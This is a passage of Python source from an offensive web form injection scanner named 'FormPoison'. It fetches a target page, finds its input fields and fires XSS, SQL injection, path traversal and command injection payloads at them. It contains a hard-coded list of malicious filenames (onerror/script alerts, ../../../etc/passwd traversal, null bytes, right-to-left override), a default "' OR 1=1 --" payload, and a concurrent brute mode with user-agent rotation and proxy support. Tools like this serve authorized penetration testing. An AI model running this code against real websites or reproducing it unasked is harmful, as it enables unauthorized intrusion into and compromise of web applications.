            vulnerabilities.append("JS_URL_EXEC")

    soup = BeautifulSoup(content, 'html.parser')

    dangerous_elements = soup.find_all(['script', 'img', 'svg', 'math', 'body'])
    for elem in dangerous_elements:
        elem_str = str(elem)
        if 'alert(1)' in elem_str:
            vulnerabilities.append(f"MUTATED_{elem.name.upper()}")

    return vulnerabilities

async def test_filename_xss(url, input_fields, cookies, user_agents, proxies=None, ssl_verify=False):

    filename_payloads = [
        # filename XSS
        'test<img src=x onerror=alert(1)>.txt',
        'file<script>alert(1)</script>.jpg',
        'photo" onerror="alert(1).png',

        # multi-extension confusion
        'test.jpg.php',
        'file.png.html',
        'document.pdf.exe',

        # Path traversal + XSS
        '../../../etc/passwd<img src=x onerror=alert(1)>',
        '..\\..\\windows\\system32<img src=x>',

        # special chars
        'file%00.jpg',
        'test%0a%0d.txt',
        'photo\0.png',

        # too long filename
        'A' * 255 + '.jpg',
        'test' + '../' * 50 + 'exploit.jpg',

        # unicode and encoding
        'file%C0%AE%C0%AE.jpg',  # UTF-8
        'photo%2e%2e%2f.jpg',    # URL enc
        'test\u202eexe.jpg',     # right-to-left override
    ]

    results = []

    for filename_payload in filename_payloads:
        file_content = generate_random_file_content()

        for field in input_fields:
            if field.get('type') == 'file' or 'file' in field.get('name', '').lower():
                vulnerability = await test_single_filename_xss(
                    url, field, filename_payload, file_content, cookies, user_agents, proxies, ssl_verify
                )
                if vulnerability:
                    results.append({
                        'field': field.get('name', 'unknown'),
                        'filename': filename_payload,
                        'vulnerability': vulnerability
                    })

    return results

def generate_random_file_content():
#filling file with whatever

    file_types = [
        # JPEG
        b'\xff\xd8\xff\xe0' + os.urandom(100),  # JPEG header + random data

        # PNG
        b'\x89PNG\r\n\x1a\n' + os.urandom(100),  # PNG header

        # PDF
        b'%PDF-1.4\n' + os.urandom(100),  # PDF header

        # ZIP
        b'PK\x03\x04' + os.urandom(100),  # ZIP header

        # Plain text
        b'This is a test file for security testing.\n' + os.urandom(50),
    ]

    return random.choice(file_types)

async def test_single_filename_xss(url, field, filename, file_content, cookies, user_agents, proxies, ssl_verify):

    try:
        current_user_agent = random.choice(user_agents)
        headers = {
            'User-Agent': sanitize_user_agent(current_user_agent),
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'
        }

        # multipart FormData
        data = aiohttp.FormData()
        data.add_field(field.get('name', 'file'),
                      file_content,
                      filename=filename,
                      content_type='application/octet-stream')

        # add more fields if they exist (expand it in future)
        data.add_field('submit', 'Upload')

        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, cookies=cookies, headers=headers,
                                  proxy=proxies.get('http') if proxies else None,
                                  ssl=ssl_verify) as response:

                content = await response.text()

                # sucess detection
                if detect_filename_xss_success(content, filename):
                    return "CONFIRMED_FILENAME_XSS"

                # is reflected?
                if filename in content:
                    return "POTENTIAL_FILENAME_XSS"

        return None

    except Exception as e:
        console.print(f"[red]Filename XSS test error: {e}[/red]")
        return None

def detect_filename_xss_success(content, filename):

    content_lower = content.lower()
    filename_clean = re.sub(r'[^a-zA-Z0-9]', '', filename).lower()

    execution_indicators = [
        r'<script[^>]*>.*?alert\(.*?</script>',
        r'onerror\s*=\s*[\'\"][^\'\"]*alert\([^\'\"]*[\'\"]',
        r'javascript:\s*alert\(1\)'
    ]

    for indicator in execution_indicators:
        if re.search(indicator, content_lower):
            return True

    if any(tag in content_lower for tag in ['<img', '<script', '<svg']):
        for part in filename_clean.split():
            if part in ['img', 'script', 'onerror', 'alert'] and part in content_lower:
                return True

    return False

async def get_user_input_for_fields(input_fields, url):
    console.print(f"""[red]⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠝⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⡀⠀⠀⠀⠀⣘⡴⡀⠀⠀
⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡄⠡⣀⣤⣶⣿⣿⣷⡱⡀⠀
⠀ Form  ⠀⠀⠀⠀⠀⠀⢀⣠⣴⠚⢉⠈⡄⢹⣿⣿⠿⠛⠉⠑⡡⠀
 Poisoner  ⢀⣠⢴⢺⡿⠋⢭⠀⡘⡄⠘⡀⢫⠀⠀⠀⠀⠀⠑⠃
⠀      ⠀⠀⢰⠁⠀⡀⠁⢣⠐⡈⢆⡱⠜⠊⠑⣀⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⢊⣇⠀⠱⣘⡤⠗⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⠠⠐⠉⠀⠁⠈⠓⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀v. 1.0.1.⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[/red]""")
    console.print(f"[yellow]Target URL: {url}[/yellow]")
    console.print(f"[yellow]Found {len(input_fields)} input fields[/yellow]")
    console.print("\n[bold cyan]Interactive Field Poisoning Shell:[/bold cyan]")
    console.print("[green]• 'poison' - use payload injection[/green]")
    console.print("[green]• test - use test value[/green]")
    console.print("[green]• skip - skip this field[/green]")
    console.print("[bold red]• Ctrl+C to exit[/bold red]\n")

    field_values = {}
    poison_fields = []

    for i, field in enumerate(input_fields, 1):
        field_name = field.get('name', f'field_{i}')
        field_type = field.get('type', 'text')
        field_id = field.get('id', '')

        console.print(f"\n[bold blue]Field {i}/{len(input_fields)}:[/bold blue]")
        console.print(f"  Name: {field_name}")
        console.print(f"  Type: {field_type}")
        if field_id:
            console.print(f"  ID: {field_id}")
        if field.get('placeholder'):
            console.print(f"  Placeholder: {field.get('placeholder')}")

        while True:
            try:
                user_input = console.input(
                    f"[bold green]Fill '{field_name}' with: [/bold green]"
                ).strip()

                if user_input.lower() == 'poison':
                    field_values[field_name] = None
                    poison_fields.append(field_name)
                    console.print(f"[red]✓ Field '{field_name}' marked for PAYLOAD INJECTION[/red]")
                    break

                elif user_input.lower() == 'test':
                    if field_type == 'email':
                        field_values[field_name] = 'test@example.com'
                    elif field_type == 'password':
                        field_values[field_name] = 'testpassword123'
                    elif 'user' in field_name.lower() or 'login' in field_name.lower():
                        field_values[field_name] = 'testuser'
                    else:
                        field_values[field_name] = 'testvalue'
                    console.print(f"[yellow]✓ Using test value: {field_values[field_name]}[/yellow]")
                    break

                elif user_input.lower() == 'skip':
                    field_values[field_name] = ''
                    console.print(f"[yellow]✓ Field '{field_name}' will be skipped (empty)[/yellow]")
                    break

                elif user_input:
                    # if there is 'poison' 
                    if "'poison'" in user_input:
                        field_values[field_name] = user_input
                        poison_fields.append(field_name)
                        console.print(f"[magenta]✓ Field '{field_name}' will inject payload at 'poison' position[/magenta]")
                        break
                    else:
                        field_values[field_name] = user_input
                        console.print(f"[green]✓ Using custom value: {user_input}[/green]")
                        break

                else:
                    console.print("[red]Please enter a value or one of the options[/red]")

            except KeyboardInterrupt:
                console.print("\n[bold red]✗ Operation cancelled by user[/bold red]")
                return None, None

    return field_values, poison_fields

async def test_mutation_xss(url, input_fields, cookies, user_agents, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0, payload_filters=None):
    results = []
    
    console.print(f"[bold yellow]🧬 Starting mXSS test...[/bold yellow]")
    console.print(f"[yellow]URL: {url}[/yellow]")
    console.print(f"[yellow]Fields: {len(input_fields)}[/yellow]")
    
    if verbose:
        for i, field in enumerate(input_fields):
            field_name = field.get('name') or field.get('id') or f'field_{i}'
            field_type = field.get('type', 'textarea' if field.name == 'textarea' else 'input')
            console.print(f"[dim]  {i+1}. {field_name} ({field_type})[/dim]")

    # Load and filter mXSS payloads
    mXSS_payloads = []
    try:
        with open("payloads.json", "r") as f:
            all_payloads = json.load(f)
        
        # Get only mutation XSS payloads
        mXSS_keywords = ['<img', '<svg', '<math', '<table', '<form', '<select', '<details', 
                        '<video', '<audio', '<body', 'onerror', 'onload', 'javascript:', 
                        '<style', '<script', 'background=', 'poster=']
        
        for payload in all_payloads:
            payload_text = payload.get('inputField', '')
            if any(keyword in payload_text.lower() for keyword in mXSS_keywords):
                mXSS_payloads.append({
                    "inputField": payload_text,
                    "category": f"mXSS_{payload.get('category', 'GENERIC')}"
                })
        
        if payload_filters:
            filter_patterns = [pattern.strip().lower() for pattern in payload_filters.split(",")]
            filtered_payloads = []
            for payload in mXSS_payloads:
                payload_text = payload.get('inputField', '').lower()
                if any(pattern in payload_text for pattern in filter_patterns):
                    filtered_payloads.append(payload)
            mXSS_payloads = filtered_payloads
            console.print(f"[yellow]Applied payload filters: {payload_filters}[/yellow]")
        
        console.print(f"[green]Loaded {len(mXSS_payloads)} mXSS payloads[/green]")
            
    except Exception as e:
        console.print(f"[red]Error loading payloads: {str(e)}[/red]")
        return results

    console.print(f"[bold cyan]Executing {len(input_fields)} fields × {len(mXSS_payloads)} payloads = {len(input_fields) * len(mXSS_payloads)} mXSS tests[/bold cyan]")

    async def test_payload(input_field, payload):
        try:
            current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0"
            headers = {'User-Agent': current_user_agent}
            data = {}

            field_name = input_field.get('name') or input_field.get('id') or 'unknown_field'
            field_name_key = input_field.get('name') or 'input_field'
            data[field_name_key] = payload['inputField']

            # other fields with test values
            for field in input_fields:
                other_field_name = field.get('name') or 'input_field'
                if other_field_name != field_name_key:
                    field_type = field.get('type', 'text')
                    if field_type == 'email':
                        data[other_field_name] = 'test@example.com'
                    elif field_type == 'password':
                        data[other_field_name] = 'password123'
                    elif other_field_name.lower() in ['username', 'user', 'login']:
                        data[other_field_name] = 'testuser'
                    elif field.name == 'textarea':
                        data[other_field_name] = 'test content'
                    else:
                        data[other_field_name] = 'test'

            if verbose_all:
                console.print(f"[dim]Sending data: {data}[/dim]")

            ssl_context = ssl.create_default_context()
            if ssl_cert and ssl_key:
                ssl_context.load_cert_chain(ssl_cert, ssl_key)

            cookie_jar = aiohttp.CookieJar()
            for key, value in cookies.items():
                cookie_jar.update_cookies({key: value})

            async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                if method.upper() == "GET":
                    response = await session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify)
                else:
                    response = await session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify)
                
                content = await response.text()
                status_code = response.status

                vulnerabilities = analyze_mutation_xss_response(content, payload['inputField'])

                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:60] + "..." if len(payload['inputField']) > 60 else payload['inputField']
                
                if vulnerabilities:
                    console.print(f"[{timestamp}] [mXSS] Testing '{field_name}' → '{short_payload}' -> [bold red]{status_code} 💀 VULNERABLE[/bold red]")
                    for vuln in vulnerabilities:
                        console.print(f"[{timestamp}] [CRITICAL] {vuln}")
                else:
                    if verbose:
                        console.print(f"[{timestamp}] [mXSS] Testing '{field_name}' → '{short_payload}' -> [green]{status_code}[/green]")

                result = {
                    "input_field": field_name,
                    "payload": payload['inputField'],
                    "category": payload['category'],
                    "status_code": status_code,
                    "vulnerabilities": vulnerabilities
                }
                results.append(result)

        except Exception as e:
            timestamp = time.strftime("%H:%M:%S")
            short_payload = payload['inputField'][:60] + "..." if len(payload['inputField']) > 60 else payload['inputField']
            field_name = input_field.get('name') or input_field.get('id') or 'unknown_field'
            console.print(f"[{timestamp}] [mXSS] Testing '{field_name}' → '{short_payload}' -> [red]Error: {str(e)}[/red]")

    # Execute tests sequentially for clean output
    completed = 0
    total = len(input_fields) * len(mXSS_payloads)
    
    for i, input_field in enumerate(input_fields):
        field_name = input_field.get('name') or input_field.get('id') or f'field_{i}'
        console.print(f"[blue]Testing field {i+1}/{len(input_fields)}: {field_name}[/blue]")
        
        for j, payload in enumerate(mXSS_payloads):
            await test_payload(input_field, payload)
            completed += 1
            
            if verbose:
                console.print(f"[dim]Progress: {completed}/{total} ({completed/total*100:.1f}%)[/dim]")
            
            if secs > 0:
                await asyncio.sleep(secs)

    # Summary
    vulnerabilities_found = sum(1 for r in results if r.get('vulnerabilities') and len(r['vulnerabilities']) > 0)
    console.print(f"\n[bold green]✓ mXSS testing completed: {len(results)} tests executed[/bold green]")
    console.print(f"[bold red]🎯 mXSS vulnerabilities found: {vulnerabilities_found}[/bold red]")
    
    # Show vulnerable results
    vulnerable_results = [r for r in results if r.get('vulnerabilities')]
    if vulnerable_results:
        console.print(f"\n[bold yellow]VULNERABLE mXSS RESULTS:[/bold yellow]")
        for result in vulnerable_results:
            console.print(f"[red]  Field: {result['input_field']}[/red]")
            console.print(f"[red]  Payload: {result['payload'][:80]}...[/red]")
            console.print(f"[red]  Vulnerabilities: {', '.join(result['vulnerabilities'])}[/red]")
            console.print(f"[red]  Status: {result['status_code']}[/red]")
            console.print("")

    # Save results
    with open("mXSS_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    console.print(f"[green]Results saved to: mXSS_results.json[/green]")
    
    return results

def analyze_mutation_xss_response(content, payload):
    vulnerabilities = []
    
    # Check for execution evidence
    if 'alert(1)' in content:
        if '<script>' in content and 'alert(1)' in content:
            vulnerabilities.append("SCRIPT_EXEC")
        if 'onerror' in content and 'alert(1)' in content:
            vulnerabilities.append("ONERROR_EXEC") 
        if 'onload' in content and 'alert(1)' in content:
            vulnerabilities.append("ONLOAD_EXEC")
        if 'javascript:' in content.lower() and 'alert(1)' in content:
            vulnerabilities.append("JS_URL_EXEC")
    
    # Check for mutated elements
    soup = BeautifulSoup(content, 'html.parser')
    
    dangerous_elements = soup.find_all(['script', 'img', 'svg', 'math', 'body'])
    for elem in dangerous_elements:
        elem_str = str(elem)
        if 'alert(1)' in elem_str:
            vulnerabilities.append(f"MUTATED_{elem.name.upper()}")
    
    # Additional mXSS detection
    if soup.find('script') and payload in str(soup):
        vulnerabilities.append("PAYLOAD_REFLECTED")
    
    return vulnerabilities
async def interactive_injection_mode(url, payloads, cookies, user_agents, method="POST",
                                   proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False,
                                   verbose=False, verbose_all=False, secs=0,
                                   brute_mode=False, max_concurrent=50, timeout=15.0,
                                   batch_size=100, batch_delay=1.0, max_retries=2):


    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)

    if not content:
        console.print("[bold red]Failed to fetch page content[/bold red]")
        return []

    input_fields = get_string_input_fields(content)

    if not input_fields:
        console.print("[bold yellow]No input fields found on the page[/bold yellow]")
        return []

    field_values, poison_fields = await get_user_input_for_fields(input_fields, url)

    if field_values is None:
        return []

    if not poison_fields:
        console.print("\n[bold yellow]⚠️ No fields marked for 'poison' - no payloads will be injected[/bold yellow]")
        response = console.input("[yellow]Continue with basic testing? (y/N): [/yellow]")
        if response.lower() not in ('y', 'yes'):
            return []

    results = []

    if brute_mode:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        connector = aiohttp.TCPConnector(
            limit=max_concurrent * 2,
            limit_per_host=max_concurrent,
            ssl=ssl_context
        )
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None

    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})

    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)

    async def test_with_user_config(payload_index=None, total_payloads=None):
        async with semaphore:
            try:
                current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1"
                headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
                data = {}

                for field_name, user_value in field_values.items():
                    if user_value is None:
                        # ONLY payload 
                        if payload_index is not None and payloads:
                            payload = payloads[payload_index % len(payloads)]
                            data[field_name] = payload['inputField']
                            payload_category = payload['category']
                        else:
                            data[field_name] = "' OR 1=1 --"
                            payload_category = "SQL"

                    elif "'poison'" in user_value:
                        # replace 'poison' with payload
                        if payload_index is not None and payloads:
                            payload = payloads[payload_index % len(payloads)]
                            # tracking 'poison' 
                            data[field_name] = user_value.replace("'poison'", payload['inputField'])
                            payload_category = payload['category'] + "_INJECTED"
                        else:
                            data[field_name] = user_value.replace("'poison'", "' OR 1=1 --")
                            payload_category = "SQL_INJECTED"

                    else:
                        # user defined input
                        data[field_name] = user_value
                        payload_category = "USER_DEFINED"
                        
                if verbose:
                    timestamp = time.strftime("%H:%M:%S")
                    current_payload = next((data[f] for f in poison_fields if f in data), "USER_CONFIG")
                    console.print(f"[{timestamp}] [INFO] Testing payload {current_payload} -> ", end="")

                # Proxy configuration
                proxy_url = proxies.get('http') if proxies else None

                if brute_mode:
                    async with aiohttp.ClientSession(
                        cookie_jar=cookie_jar,
                        connector=connector,
                        timeout=timeout_config
                    ) as session:
                        async with session.request(
                            method, url, data=data, headers=headers,
                            proxy=proxy_url, ssl=ssl_verify
                        ) as response:
                            content = await response.text()
                            status_code = response.status
                else:
                    ssl_context = ssl.create_default_context()
                    if ssl_cert and ssl_key:
                        ssl_context.load_cert_chain(ssl_cert, ssl_key)

                    async with aiohttp.ClientSession(
                        cookie_jar=cookie_jar,
                        connector=aiohttp.TCPConnector(ssl=ssl_context)
                    ) as session:
                        async with session.request(
                            method, url, data=data, headers=headers,
                            proxy=proxy_url, ssl=ssl_verify
                        ) as response:
                            content = await response.text()
                            status_code = response.status

                current_payload = next((data[f] for f in poison_fields if f in data), "USER_CONFIG")
                vulnerabilities = analyze_response(content, response.headers, payload_category, current_payload, verbose_all)
                if verbose:
                    injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
                    if injection_detected:
                        console.print(f"[bold red]{status_code}[/bold red]")
                    else:
                        console.print(f"[green]{status_code}[/green]")
                result = {
                    "user_config": field_values,
                    "poison_fields": poison_fields,
                    "payload_used": current_payload if poison_fields else "NONE",
                    "user_agent": current_user_agent,
                    "response_code": status_code,
                    "vulnerabilities": vulnerabilities,
                    "request_data": data
                }

                return result

            except Exception as e:
                current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
                return {
                    "user_config": field_values,
                    "poison_fields": poison_fields,
                    "payload_used": "ERROR",
                    "user_agent": current_user_agent,
                    "response_code": "Error",
                    "vulnerabilities": [f"Request Failed: {str(e)}"],
                    "request_data": {}
                }

    table = Table(title=f"Interactive Injection Results" + (" | BRUTE MODE" if brute_mode else ""))
    table.add_column("Poison Fields", style="cyan", no_wrap=False)
    table.add_column("Payload Used", style="cyan", no_wrap=False)
    table.add_column("User Agent", style="cyan", no_wrap=False)
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerabilities", style="bold green")

    if poison_fields and payloads:
        console.print(f"\n[bold green]🧪 Testing {len(payloads)} payloads on {len(poison_fields)} poison fields[/bold green]")

        if brute_mode:
            # brute mode
            all_payloads = list(range(len(payloads)))
            total_batches = (len(all_payloads) + batch_size - 1) // batch_size

            with Progress(BarColumn(bar_width=None), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn(), console=console) as progress:
                main_task = progress.add_task("[cyan]Testing payloads...", total=len(payloads))

                for batch_num in range(total_batches):
                    start_idx = batch_num * batch_size
                    end_idx = min(start_idx + batch_size, len(all_payloads))
                    batch_payload_indices = all_payloads[start_idx:end_idx]

                    tasks = [test_with_user_config(payload_idx, len(payloads)) for payload_idx in batch_payload_indices]
                    for future in asyncio.as_completed(tasks):
                        result = await future
                        results.append(result)

                        # Update UI
                        table.add_row(
                            ", ".join(poison_fields),
                            result["payload_used"][:100] + "..." if len(result["payload_used"]) > 100 else result["payload_used"],
                            result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
                            str(result["response_code"]),
                            ", ".join(result["vulnerabilities"])
                        )

                        progress.update(main_task, advance=1)

                        if verbose or verbose_all:
                            console.print(f"[bold blue]Tested with payload: {result['payload_used']}[/bold blue]")
                            console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")

                    if batch_num < total_batches - 1 and batch_delay > 0:
                        await asyncio.sleep(batch_delay)

            if connector:
                await connector.close()

        else:
                for i in range(len(payloads)):
                    result = await test_with_user_config(i, len(payloads))
                    results.append(result)

                    table.add_row(
                        ", ".join(poison_fields),
                        result["payload_used"][:100] + "..." if len(result["payload_used"]) > 100 else result["payload_used"],
                        result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
                        str(result["response_code"]),
                        ", ".join(result["vulnerabilities"])
                    )


                    if verbose or verbose_all:
                        console.print(f"[bold blue]Tested with payload: {result['payload_used']}[/bold blue]")
                        console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")

                    if secs > 0:
                        await asyncio.sleep(secs)
    else:
        # one attemp
        console.print("\n[bold yellow]🧪 Testing with user configuration (single request)[/bold yellow]")
        result = await test_with_user_config()
        results.append(result)

        table.add_row(
            ", ".join(poison_fields) if poison_fields else "NONE",
            result["payload_used"],
            result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
            str(result["response_code"]),
            ", ".join(result["vulnerabilities"])
        )

    console.print(table)

    results_metadata = {
        "parameters": {
            "interactive_mode": True,
            "user_field_config": field_values,
            "poison_fields": poison_fields,
            "brute_mode": brute_mode,
            "max_concurrent": max_concurrent,
            "timeout": timeout,
            "batch_size": batch_size,
            "batch_delay": batch_delay,
            "max_retries": max_retries
        },
        "results": results
    }

    with open("interactive_test_results.json", "w") as f:
        json.dump(results_metadata, f, indent=4)

    console.print(f"[bold green]Interactive test results saved to 'interactive_test_results.json'[/bold green]")

    return results

async def automated_targeted_testing(url, targeted_payloads, scan_report, cookies, user_agents, 
                                   proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False,
                                   brute_mode=False, max_concurrent=50, timeout=15.0):
    
    results = []
    
    vuln_groups = {}
    for payload in targeted_payloads:
        vuln_type = payload.get('targeted_vulnerability', 'unknown')
        if vuln_type not in vuln_groups:
            vuln_groups[vuln_type] = []
        vuln_groups[vuln_type].append(payload)
    
    # page content for form analysis
    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)
    
    if not content:
        console.print("[bold red]Failed to fetch page content[/bold red]")
        return results

    # test each vulnerability group with appropriate methods
    for vuln_type, vuln_payloads in vuln_groups.items():
        console.print(f"[blue]Testing {len(vuln_payloads)} payloads for: {vuln_type}[/blue]")
        
        if 'sql' in vuln_type.lower() or 'injection' in vuln_type.lower():
            await test_sql_injection_targeted(url, vuln_payloads, cookies, user_agents, content,
                                            proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout)
        
        elif 'xss' in vuln_type.lower() or 'cross' in vuln_type.lower():
            await test_xss_targeted(url, vuln_payloads, cookies, user_agents, content,
                                  proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout)
        
        elif 'path' in vuln_type.lower() or 'traversal' in vuln_type.lower() or 'file' in vuln_type.lower():
            await test_path_traversal_targeted(url, vuln_payloads, cookies, user_agents, content,
                                             proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'command' in vuln_type.lower() or 'exec' in vuln_type.lower():
            await test_command_injection_targeted(url, vuln_payloads, cookies, user_agents, content,
                                                proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'deserialization' in vuln_type.lower() or 'serialization' in vuln_type.lower():
            await test_deserialization_targeted(url, vuln_payloads, cookies, user_agents, content,
                                              proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout)
        
        elif 'ssrf' in vuln_type.lower() or 'server_request' in vuln_type.lower():
            await test_ssrf_targeted(url, vuln_payloads, cookies, user_agents, content,
                                   proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'xxe' in vuln_type.lower() or 'xml' in vuln_type.lower():
            await test_xxe_targeted(url, vuln_payloads, cookies, user_agents, content,
                                  proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'race' in vuln_type.lower() or 'condition' in vuln_type.lower():
            await test_race_condition_targeted(url, vuln_payloads, cookies, user_agents, content,
                                             proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'buffer' in vuln_type.lower() or 'overflow' in vuln_type.lower():
            await test_buffer_overflow_targeted(url, vuln_payloads, cookies, user_agents, content,
                                              proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'idor' in vuln_type.lower() or 'direct_object' in vuln_type.lower():
            await test_idor_targeted(url, vuln_payloads, cookies, user_agents, content,
                                   proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'csrf' in vuln_type.lower() or 'forgery' in vuln_type.lower():
            await test_csrf_targeted(url, vuln_payloads, cookies, user_agents, content,
                                   proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'open_redirect' in vuln_type.lower():
            await test_open_redirect_targeted(url, vuln_payloads, cookies, user_agents, content,
                                            proxies, ssl_cert, ssl_key, ssl_verify)
        
        elif 'template' in vuln_type.lower() or 'ssti' in vuln_type.lower():
            await test_ssti_targeted(url, vuln_payloads, cookies, user_agents, content,
                                   proxies, ssl_cert, ssl_key, ssl_verify)
        
        else:
            await test_all_forms(url, vuln_payloads, "AUTO", cookies, user_agents,
                               proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
                               ssl_verify=ssl_verify, brute_mode=brute_mode,
                               max_concurrent=max_concurrent, timeout=timeout)
    
    return results

async def test_sql_injection_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout):
    console.print("[yellow]🎯 Running targeted SQL injection tests[/yellow]")
    
    # SQL-specific payloads
    sql_specific_payloads = [p for p in payloads if 'SQL' in p['category']]
    
    if not sql_specific_payloads:
        console.print("[red]No SQL-specific payloads found[/red]")
        return
    
    # different SQL injection techniques
    techniques = ['union', 'boolean', 'time', 'error', 'stacked']
    
    for technique in techniques:
        technique_payloads = [p for p in sql_specific_payloads if technique in p['inputField'].lower()]
        if technique_payloads:
            console.print(f"[blue]Testing {technique}-based SQLi with {len(technique_payloads)} payloads[/blue]")
            await test_all_forms(url, technique_payloads, "SQL", cookies, user_agents,
                               proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
                               ssl_verify=ssl_verify, brute_mode=brute_mode,
                               max_concurrent=max_concurrent, timeout=timeout)

async def test_xss_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout):
    console.print("[yellow]🎯 Running targeted XSS tests[/yellow]")
    
    soup = BeautifulSoup(content, 'html.parser')
    
    # Analyze context for XSS
    script_tags = soup.find_all('script')
    event_handlers = soup.find_all(onclick=True) + soup.find_all(onload=True) + soup.find_all(onerror=True)
    
    # XSS payloads by context
    dom_payloads = [p for p in payloads if 'DOM' in p['category']]
    reflected_payloads = [p for p in payloads if 'HTML' in p['category'] or 'XSS' in p['category']]
    
    if dom_payloads and (script_tags or event_handlers):
        console.print(f"[blue]Testing DOM-based XSS with {len(dom_payloads)} payloads[/blue]")
        await test_all_forms(url, dom_payloads, "HTML", cookies, user_agents,
                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
                           ssl_verify=ssl_verify, brute_mode=brute_mode,
                           max_concurrent=max_concurrent, timeout=timeout)
    
    if reflected_payloads:
        console.print(f"[blue]Testing reflected XSS with {len(reflected_payloads)} payloads[/blue]")
        await test_all_forms(url, reflected_payloads, "HTML", cookies, user_agents,
                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
                           ssl_verify=ssl_verify, brute_mode=brute_mode,
                           max_concurrent=max_concurrent, timeout=timeout)

async def test_path_traversal_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted path traversal tests[/yellow]")
    
    path_payloads = [p for p in payloads if 'PATH' in p['category']]
    
    if path_payloads:
        # file upload
        soup = BeautifulSoup(content, 'html.parser')
        file_inputs = soup.find_all('input', {'type': 'file'})
        
        if file_inputs:
            console.print(f"[blue]Testing {len(path_payloads)} path traversal payloads on file inputs[/blue]")
            for file_input in file_inputs:
                await test_input_field(url, path_payloads, "PATH", cookies, user_agents, file_input,
                                     method="POST", proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)

async def test_command_injection_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted command injection tests[/yellow]")
    
    cmd_payloads = [p for p in payloads if 'COMMAND' in p['category']]
    
    if cmd_payloads:
        console.print(f"[blue]Testing {len(cmd_payloads)} command injection payloads[/blue]")
        await test_all_forms(url, cmd_payloads, "COMMAND", cookies, user_agents,
                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)

async def test_deserialization_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify, brute_mode=False, max_concurrent=50, timeout=15.0):
    console.print("[yellow]🎯 Running targeted deserialization tests[/yellow]")
    
    deserialization_payloads = [p for p in payloads if 'DESERIALIZATION' in p['category'] or 'XXE' in p['category']]
    
    if not deserialization_payloads:
        console.print("[red]No deserialization-specific payloads found[/red]")
        return []

